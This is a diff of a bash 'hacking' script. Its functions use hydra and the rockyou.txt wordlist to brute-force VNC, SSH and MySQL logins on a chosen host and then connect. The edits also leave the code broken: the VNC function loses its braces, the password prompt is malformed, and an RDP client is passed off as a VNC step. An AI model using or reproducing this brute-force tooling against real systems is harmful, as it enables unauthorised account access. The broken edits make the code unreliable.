@@ -197,7 +197,7 @@ else
                 read -p "Input Port: " port
             }
 
-            RunHackingCommandWithVNC() {
+            RunHackingCommandWithVNC() 
                 if [[ $service == 5900 || $service == "VNC" ]]; then
                     # Checks if the user has put anything in the 'Input Username' function and the hostname function
                     # If not, it will prompt the user to enter the username and hostname
@@ -210,6 +210,8 @@ else
                     else
                         # Crack VNC password
                         hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host:$port
+                        
+                  
                         # Alerts the user that the computer is trying to connect to the VNC server
                         title="Connecting to ${host}"
                         Connecting_To_VNC_SERVER="We are connecting you to '${host}'. Please wait..."
@@ -224,14 +226,16 @@ else
                         echo
                         echo "${title}"
                         echo "${Connected_To_VNC_SERVER}"
+                        read -p "Input username: " username
+                        read -p -s "Input password: " password
                         # Put the
                         echo
-                        echo "Loading VNC server..."
-                        open "vnc://${host}"
+                        echo "Loading xfreerdp server..."
+                        xfreerdp /u:"${username}" /v:"${host}" /p:"${password}"
                         exit
                     fi
                 fi
-            }
+            
 
             RunHackingCommandWithSSH() {
                 if [[ $service == 22 || $service == "ssh" ]]; then
@@ -246,7 +250,7 @@ else
                     else
 
                         # Crack SSH password
-                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host:$port
+                        hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host:$port
                         # Alerts the user that the computer is trying to connect to the ssh server
                         title="Connecting to ${user}"
                         Connecting_To_SSH_SERVER="We are connecting you to ${user}. Please wait..."
@@ -279,10 +283,10 @@ else
                     # it will continue as normal
                     else
                         # Crack MySQL password
-                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host:$port
+                        hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host:$port
                         echo "Loading MySQL server..."
                         sleep 3
-                        mysql -u $user -p -A
+                        mysql -u "${user}" -p -A
                     fi
                 fi
             }
